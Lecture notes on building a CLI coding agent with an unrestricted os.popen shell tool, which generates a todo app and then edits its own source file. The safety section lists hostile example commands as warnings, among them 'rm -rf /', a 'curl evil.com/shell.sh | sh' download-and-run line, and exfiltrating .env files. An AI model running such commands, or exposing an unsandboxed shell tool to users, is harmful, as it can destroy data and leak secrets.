---
title: Building a CLI Coding Assistant
date: 2026-05-28
source: "Section 7 / Lecture 5"
type: lecture-notes
status: in-progress
section: "Section 7: Building AI Agents and Agentic Workflows"
tags:
  - agents
  - coding-assistant
  - cli
  - tool-calling
  - run-command
  - vibe-coding
  - cursor
  - claude-code
  - hands-on
  - safety
related:
  - "[[03 - Building a Weather Agent]]"
  - "[[04 - Structured Outputs with Pydantic]]"
related_skills:
  - "agent-loop"
  - "self-modifying-agent"
---

# Building a CLI Coding Assistant

> [!NOTE]
> **TL;DR**
> Take the agent from [[04 - Structured Outputs with Pydantic]] and **swap the `get_weather` tool for `run_command`** — a tool that executes any shell command via `os.system`. Update the system prompt to describe this single, almighty tool. Re-run with the prompt *"create a todo app with HTML, CSS, JavaScript in a folder called todo_app with all CRUD operations"* — the agent autonomously **creates the folder, writes the HTML/CSS/JS files, iteratively debugs them**, all via shell commands. Same agent pattern as before; only the tool changed. The closer: ask the agent to **modify its own `agent.py`** to add more granular tools — the agent edits its own code. End-of-section reflection: Section 7 produced a real working agent in ~70 lines, the same pattern Cursor / Claude Code / Devin scale up. Next section: **RAG**.

> [!NOTE]
> **Where this fits**
> Fifth and final note of **Section 7: Building AI Agents and Agentic Workflows**. Closes out the section with a dramatic build: vibe-code an actual app from one prompt. Demonstrates that the agent pattern from [[03 - Building a Weather Agent]] + [[04 - Structured Outputs with Pydantic]] is **completely general** — change the tool, change the use case. After this, the course pivots to **RAG** (Section 8-9).

> [!WARNING]
> **Safety**
> Giving an LLM a `run_command(cmd: str)` tool that runs **anything** on the shell is **objectively dangerous**. This works as a learning exercise in a sandboxed environment, but should never ship to production without sandboxing (Docker), allow-lists, dry-run modes, or user approval steps. Production systems use **granular per-action tools** instead.

---

## 1. The big idea

The weather agent had one tool that hit one API. What if instead the agent had **one tool that could do anything on the operating system**?

That tool exists: the **shell**. Every operation — create a file, run a build, install a package, edit code — is a shell command. Give the agent `run_command`, and it can do **everything**.

```python
def run_command(cmd: str) -> str:
    """Run a shell command, return its output."""
    import os
    return os.popen(cmd).read()
```

Three lines. Infinite capability.

Add one more tool to the agent: `def run_command`. Import the built-in `os` module, use `os.system` (or `os.popen`) to run the command, capture the result, and return it. That's it — a tool that can run any kind of command on the system.

---

## 2. The full code change

Starting from the agent in [[04 - Structured Outputs with Pydantic]], two changes:

### Change 1 — Add the tool function

```python
import os

def run_command(cmd: str) -> str:
    """Execute a shell command and return its output."""
    result = os.popen(cmd).read()
    return result if result else "Command executed successfully (no output)"

available_tools = {
    "run_command": run_command,
    # "get_weather": get_weather,    # can keep or remove
}
```

### Change 2 — Update the system prompt

Add to the available-tools section:

```text
Available tools:
- run_command(cmd: str) → str
  Takes a system (Linux) command as a string and executes it on the user's system,
  returning the output from that command. Use this for file operations, running
  builds, installing packages, anything CLI-based.
```

That's it. Two small edits to a 70-line file. Now run.

---

## 3. The demo — vibe-coding a todo app

The prompt:
```
Create a folder on my system named todo_app, then inside it create a todo app
using HTML, CSS, and JavaScript with all CRUD operations.
```

What the agent does autonomously:

| Step | What the agent does |
|---|---|
| 1 | Plans the breakdown |
| 2 | `run_command("mkdir todo_app")` → folder created |
| 3 | `run_command("touch todo_app/index.html")` → file created |
| 4 | `run_command("cat > todo_app/index.html << EOF ... EOF")` → writes HTML content |
| 5 | Same for `style.css` |
| 6 | Same for `script.js` (with CRUD logic) |
| 7 | Final `output` step → "Todo app created at todo_app/" |

The user does **nothing** after the initial prompt. The agent reasons, decides which commands, runs them in order, and stops when done.

After the run, the folder has an HTML file, a CSS file, and a JavaScript file — all done. Opening `todo_app/index.html` in a browser: a working CRUD todo app.

---

## 4. The follow-up — iterative refinement

Keep issuing more prompts to the **same agent session**:

```
Make the overall theme of the todo app purple and more modern.
```

The agent:
- Reads the current `style.css` via `run_command("cat todo_app/style.css")`.
- Plans the changes.
- Writes the new `style.css` via `run_command` again.

Result: theme updated.

```
Add a dark theme toggle with purple as primary.
```

Agent:
- Edits `index.html` to add a toggle button.
- Edits `script.js` to add the toggle handler.
- Edits `style.css` for dark-mode variables.

Result: dark mode added.

> [!TIP]
> **What this is**
> **Vibe-coding**: the user expresses intent in natural language; the agent autonomously translates it into shell-and-file operations. This is what Cursor, Claude Code, and Devin do at much larger scale.

---

## 5. The crash — when things go wrong

Mid-debug, the agent hits an API rate limit:

```
RateLimitError: Reached request rate limit.
```

The agent crashes mid-loop. In production, this would be handled with:

| Mitigation | What it does |
|---|---|
| **Exponential backoff** | Retry after delays — 1s, 2s, 4s, ... |
| **Tiered fallback** | If gpt-4o is rate-limited, switch to gpt-4o-mini |
| **Token budget tracking** | Stop the agent if total tokens cross a threshold |
| **Checkpoint + resume** | Persist `message_history`, resume from last good state |
| **Multi-provider failover** | Switch to a different LLM (Gemini, Claude) when one fails |

None of these are coded here — but the failure mode is realistic and worth noticing.

---

## 6. The self-modifying agent finale

The final prompt is delightful:

```
In the folder named weather_agent, there is an agent.py file which has two tools.
Can you add more tools for all file handling — create_file, read_file, list_directory,
delete_file, update_file, etc.
```

What happens:
- The agent uses `run_command("cat weather_agent/agent.py")` to **read its own source code**.
- The agent reasons about where to add new tools.
- The agent uses `run_command` to **write a new version of agent.py** with more granular tools.

The agent is now coding itself. That's wild. Those per-action functions become more precise tools — right now everything is very autonomous because it's all going through `def run_command`. With the granular functions wired in as tools with proper context, the result is essentially a fully-fledged Cursor-like CLI built on a custom agent loop.

The agent **modifies itself** to gain more granular capabilities. This is the precursor pattern to agents that improve their own tools over time.

---

## 7. The architectural lesson

The pattern here is exactly what's behind real coding agents:

| Real product | What it is |
|---|---|
| **Cursor** | Agent with file-read / file-write / shell tools, integrated into VS Code |
| **Claude Code** | Anthropic's CLI agent — also a `run_command`-style tool + file tools |
| **GitHub Copilot Workspace** | Agent that plans + edits + tests across a repo |
| **Devin** | Multi-step autonomous SWE agent — same loop, more tools, longer horizon |
| **Aider** | Open-source coding agent — same pattern |

All of these are scaling the **same agent loop** built here in 70 lines:
1. System prompt with tool descriptions.
2. User goal.
3. Loop: LLM produces next step → if tool, execute → if output, stop.
4. Each tool is a Python function returning a string.

The differences are **engineering polish**: more tools, sandboxing, multi-file context, code-graph awareness, smarter prompts. The core is the same.

---

## 8. The granular-tools refactor

The right production pattern: move from `run_command` to **per-operation tools**.

```python
def create_file(path: str, content: str) -> str: ...
def read_file(path: str) -> str: ...
def update_file(path: str, content: str) -> str: ...
def delete_file(path: str) -> str: ...
def list_directory(path: str) -> str: ...
def run_python(code: str) -> str: ...
def run_tests(path: str) -> str: ...
def git_diff() -> str: ...
def git_commit(message: str) -> str: ...
```

| Advantage | Detail |
|---|---|
| **Easier for the LLM** | One clear tool per action vs. inventing shell commands |
| **Easier to log** | Clear semantic events instead of opaque shell strings |
| **Easier to sandbox** | Block specific actions instead of allow-listing shell commands |
| **Easier to test** | Mock individual tools instead of the whole shell |
| **Easier for safety** | "Confirm before delete" hooks per-tool |

Same agent loop. More tools. More precise control.

---

## 9. Safety considerations

> [!WARNING]
> **`run_command` as built is dangerous**
> This agent can run **any command**. If asked nicely, it could:
> - `rm -rf /` (delete the file system).
> - `curl evil.com/shell.sh | sh` (download and run malware).
> - `git push --force` (rewrite history).
> - Exfiltrate `.env` files.
>
> This is a **learning exercise**. For production, granular tools + sandboxing + human approval are essential.

Real-world mitigations:

| Mitigation | How |
|---|---|
| **Sandbox the agent's shell** | Run in a Docker container with no network, mounted volume only |
| **Allow-list tools** | Per-tool decisions: "yes to read, no to delete without confirm" |
| **Dry-run mode** | Print commands the agent would run; user approves before execution |
| **Read-only by default** | Write tools require user opt-in |
| **Rate-limit destructive ops** | "No more than 5 deletes per minute" |
| **Diff preview** | Show file edits as diffs before applying |
| **Audit log** | Every tool call recorded for forensics |

Cursor and Claude Code do most of these; Devin sandboxes everything in a remote container.

---

## 10. End of Section 7 — the recap

This closes out **Section 7: Building AI Agents and Agentic Workflows**:

| Note | Topic |
|---|---|
| 01 | Section Intro — Welcome to Agentic AI |
| 02 | What are AI Agents |
| 03 | Building a Weather Agent |
| 04 | Structured Outputs with Pydantic |
| 05 | Building a CLI Coding Assistant (this note) |

The progression:
1. **Conceptually understand** what an agent is.
2. **Build the simplest possible agent** (one tool, one API).
3. **Make it reliable** with structured outputs.
4. **Demonstrate generality** by swapping the tool for something powerful.

By the end, the same ~70-line agent template can be repointed at any domain by changing the tools.

That wraps up the LLM agents section. Section 8 picks up with **RAG (Retrieval-Augmented Generation)** — what it is, and why it's something every industry struggles with.

---

## 11. The transition to RAG (preview)

Why **RAG comes next**:

The agent in this section can call **APIs** (weather, shell). But it can't answer questions about **internal documents** the model wasn't trained on — your company's PDF library, your private codebase, your team's wiki.

RAG (Retrieval-Augmented Generation) is the pattern that **grounds the LLM in private/specific data**:
1. Embed all documents.
2. At query time, find relevant chunks via semantic search.
3. Inject those chunks into the prompt.
4. The LLM answers using them.

Combined with this section's agent loop, RAG enables **agents that can answer questions about your own data**. That's where the next two sections go.

---

## 12. Main takeaways

- Same agent pattern from [[03 - Building a Weather Agent]] + [[04 - Structured Outputs with Pydantic]] — **only the tool changes**.
- `run_command(cmd: str) -> str` is an **almighty single tool**.
- Vibe-coding works: one prompt → working app.
- Self-modifying agents are possible — the agent edited its own `agent.py`.
- Real coding agents (Cursor, Claude Code, Devin, Aider) scale the **same pattern**.
- For production: replace `run_command` with **granular per-action tools** + sandboxing.
- Be aware of safety — `run_command` is dangerous if exposed broadly.
- Section 7 closes with a working agent in ~70 lines.
- **Next: RAG** — agents that answer questions about your data.

---

## 13. Things I still want to figure out

- For production sandboxing, what's the **right Docker image** to give the agent?
- How do **diff-based** tools (return a diff, apply with user approval) compare to direct edits?
- For multi-file refactors, how does the agent **maintain context** beyond what fits in one prompt?
- What's the **best practice** for agent error-recovery when a tool fails?
- How do agents like Cursor handle **very large repos** (>100 files)?
- For coding agents, when is it better to use **OpenAI's native function calling** vs the CoT-with-tool pattern?
- How does **prompt caching** affect long agent runs?

---

## 14. Things to dig into

- **Aider**: https://github.com/Aider-AI/aider — open-source CLI coding agent; readable codebase, same patterns.
- **OpenInterpreter**: https://github.com/OpenInterpreter/open-interpreter — desktop coding agent.
- **OpenAI Cookbook agents**: https://cookbook.openai.com/examples/agents — patterns from OpenAI.
- **Hands-on**: replace `run_command` with `create_file` + `read_file` + `list_directory` + `delete_file` + `run_python`. Compare reliability vs the single-tool version.

---

## 15. End of section

End of **Section 7**. The course now has:

| Capability | From which section |
|---|---|
| Understanding LLMs | Section 1 |
| Calling LLM APIs | Section 2 |
| Prompt engineering | Section 3 |
| Prompt styles | Section 4 |
| Running LLMs locally | Section 5 |
| Direct Hugging Face access | Section 6 |
| **Building agents with tools** | **Section 7** ← this |

Next:

- [ ] **Section 8: Building Chat with PDF Project using RAG** — grounding the LLM in custom data.

---

## Related
- [[03 - Building a Weather Agent]] — the agent template this lecture extends.
- [[04 - Structured Outputs with Pydantic]] — reliability layer.
- [[02 - What are AI Agents]] — conceptual foundation.
- [[07 - Automating Chain of Thought]] — the underlying loop.

## Sources
- Section 7, Lecture 5 — *"Building a CLI Coding Assistant"*.
- Aider — https://github.com/Aider-AI/aider
- OpenInterpreter — https://github.com/OpenInterpreter/open-interpreter
- OpenAI Cookbook (agents) — https://cookbook.openai.com/examples/agents
